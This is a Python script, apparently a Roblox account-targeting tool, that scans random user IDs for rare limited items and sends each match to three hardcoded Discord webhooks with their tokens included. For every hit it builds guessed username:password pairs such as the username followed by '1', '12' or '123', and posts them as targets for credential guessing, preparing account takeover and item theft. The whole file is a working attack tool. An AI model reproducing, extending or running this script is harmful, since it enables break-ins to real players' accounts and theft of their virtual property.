import requests
import random
import os
from colorama import *
from dhooks import *
import time
import json
import datetime
import re

os.system("clear")
hook_url = "https://discord.com/api/webhooks/1307686709886062683/UQStVdOK09gUHktWxXt1x6gVYIy_q6Sb2OWM0smEbzWr_mDUibQx-f-TK5etnr7FbQ0M"
hook = Webhook(hook_url)
hook_url2 = "https://discord.com/api/webhooks/1314944925598482462/IN9CfpDqm73Ai6fDuhpBpOy4HNAN3a_JUBiOZl3QvltXFY5FiyMqMGZsardEnr16We74"
hook2 = Webhook(hook_url2)
hook_url3 = "https://discord.com/api/webhooks/1315100835121860630/nBGCRIYkw4WvcuNtP_vboV9W-yqOB-G3-qMROGKKlEUMfcG8YkY7_hCOvX03B_I_9UEM"
hook3 = Webhook(hook_url3)

def get_username(user_id):
    """Fetch the username of a Roblox user by their ID."""
    try:
        response = requests.get(f"https://users.roblox.com/v1/users/{user_id}")
        response.raise_for_status()
        return response.json().get('name')
    except requests.exceptions.RequestException:
        return None

def check_inventory_for_item(user_id, item_name):
    """Check if the user's inventory contains a specific item."""
    try:
        response = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles")
        response.raise_for_status()
        items = response.json().get('data', [])
        return any(item_name.lower() in item.get('name', '').lower() for item in items)
    except requests.exceptions.RequestException:
        return False

def find_user_with_items(item_names):
    """Continuously check random Roblox users until one is found with one of the specified items."""
    while True:
        user_id = random.randint(1, 6313400)
        url = f"https://www.roblox.com/users/{user_id}/profile?friendshipSourceType=PlayerSearch"
        username = get_username(user_id)

        if username:
            print(f"{Fore.GREEN}Checking user: {username} (ID: {user_id})")
            for item_name in item_names:
                if check_inventory_for_item(user_id, item_name):
                    print(f"{Fore.BLUE}User {username} (ID: {user_id}) has the item '{item_name}'!{Style.RESET_ALL}")
                    print(f"Profile link: {url}")
                    hook2.send(f"[{username} - {item_name} - {user_id}]({url})")
                    hook.send(f"[{username} - {item_name} - {user_id}]({url})")
                    hook3.send(f"[{username} - {item_name} - {user_id}]({url})")
                    if re.search(r'\d', username):
                        no_num = username.strip("1234567890")
                        hook.send(f"```New Hit!{item_name} account```")
                        hook2.send(f"```New Hit!{item_name} account```")
                        hook3.send(f"```New Hit!{item_name} account```")
                        hook.send(f"```{username}:{no_num}1```")
                        hook.send(f"```{username}:{no_num}12```")
                        hook.send(f"```{username}:{no_num}123```")
                        hook2.send(f"```{username}:{no_num}1```")
                        hook2.send(f"```{username}:{no_num}12```")
                        hook2.send(f"```{username}:{no_num}123```")
                        hook3.send(f"```{username}:{no_num}1```")
                        hook3.send(f"```{username}:{no_num}12```")
                        hook3.send(f"```{username}:{no_num}123```")
                    else:
                        hook.send(f"```New Hit!{item_name} account```")
                        hook.send(f"```New Hit!{item_name} account```")
                        hook.send(f"```New Hit!{item_name} account```")
                        hook.send(f"```{username}:{username}1```")
                        hook.send(f"```{username}:{username}12```")
                        hook.send(f"```{username}:{username}123```")
                        hook2.send(f"```{username}:{username}1```")
                        hook2.send(f"```{username}:{username}12```")
                        hook2.send(f"```{username}:{username}123```")
                        hook3.send(f"```{username}:{username}1```")
                        hook3.send(f"```{username}:{username}12```")
                        hook3.send(f"```{username}:{username}123```")

                    try:
                        data = {
                            "username": username,
                            "item_name": item_name,
                            "user_id": user_id,
                            "url": url
                            }
                        file = open("Filtered.json", "a")
                        json.dump(data, file, indent=4)
                        file.write("\n")
                    except:
                        file = open("Filtered.json", "w")
                        file.write("///json///")
                        file.write("\n")
                        file.close()


        else:
            print(f"{Fore.RED}Failed to fetch user {user_id}. Continuing...{Style.RESET_ALL}")

def press():
    number = 100
    for i in range(number):
        user_id = random.randint(1, 6313400)
        url = f"https://www.roblox.com/users/{user_id}/profile?friendshipSourceType=PlayerSearch"
        api_url = f"https://users.roblox.com/v1/users/{user_id}"
        try:
            response = requests.get(api_url)
            if response.status_code == 200:
                info = response.json()
                username = info.get('name', 'Unknown')
                created = info.get('created', 'Unkown')
                if "123" in username:
                    print(f"{Fore.BLUE}User {username} (ID: {user_id}) has '123' in name!{Style.RESET_ALL}{Fore.CYAN}")
                    hook3.send(f" [{username} - '123' - {user_id} - ]({url})\n{username}")
                    hook2.send(f" [{username} - '123' - {user_id} - ]({url})\n{username}")
                    hook.send(f" [{username} - '123' - {user_id} - ]({url})\n{username}")
                elif "1234" in username:
                    print(f"{Fore.BLUE}User {username} (ID: {user_id}) has '1234' in name!{Style.RESET_ALL}{Fore.CYAN}")
                    hook3.send(f" [{username} - '123' - {user_id} - ]({url})\n{username}")
                    hook2.send(f" [{username} - '123' - {user_id} - ]({url})\n{username}")
                    hook.send(f" [{username} - '123' - {user_id} - ]({url})\n{username}")
                else:
                    print(f"{username}")

            else:
                print(f"USERID : {user_id} IS BANNED")
        except Exception as e:
            print(f"{e}")
    press()


def press2():
    while True:
        user_id = random.randint(1, 100000000)
        url = f"https://www.roblox.com/users/{user_id}/profile?friendshipSourceType=PlayerSearch"
        try:
            file = open("links.txt", "a")
            file.write(f"{url}\n")
            file.close()
        except:
            file = open("links.txt", "w")
            file.write(f"{url}\n")
            file.close()
        print(f"{Fore.BLUE}{url}")
    input("DONE")


if __name__ == "__main__":
    items_to_check = ["Shaggy",
                      "Perfectly Legitimate Business Hat",
                      "Opened Stainless Steel Gift of December 26th" ,
                      "The Riddling Skull" ,
                      "Wintertime R R R" ,
                      "Ghost Fedora" ,
                      "Ticket Beanie" ,
                      "Opened Gift of Passage",
                      "Sly Cat",
                      "Epic Face",
                      "Auburn Shaggy"
                      ]
    print(f"{Fore.CYAN}Made by ArcticHonour")
    choice1 = input(f"{Style.BRIGHT}{Fore.MAGENTA}OFFLINE OR ONLINE OR INV FILTER? 1/2/3")
    if choice1 == "1":
        press2()
    elif choice1 == "2":
        press()
    elif choice1 == "3":
        print("19027209 - legit")
        x = datetime.datetime.now()
##        hook2.send(f"```Scraping Users from user id 1 to user id 6313400 with filters of {items_to_check} Date time is {x}```")
##        hook3.send(f"```Scraping Users from user id 1 to user id 6313400 with filters of {items_to_check} Date time is {x}```")
##        hook.send(f"```Scraping Users from user id 1 to user id 6313400 with filters of {items_to_check} Date time is {x}```")
        for items in items_to_check:
            print(f"Filters set - {items}")
        find_user_with_items(items_to_check)
    else:
        try:
            file = open("links.txt", "r")
            content = file.read()
            for contents in content:
                print(contents)
        except Exception as error:
            print(error)
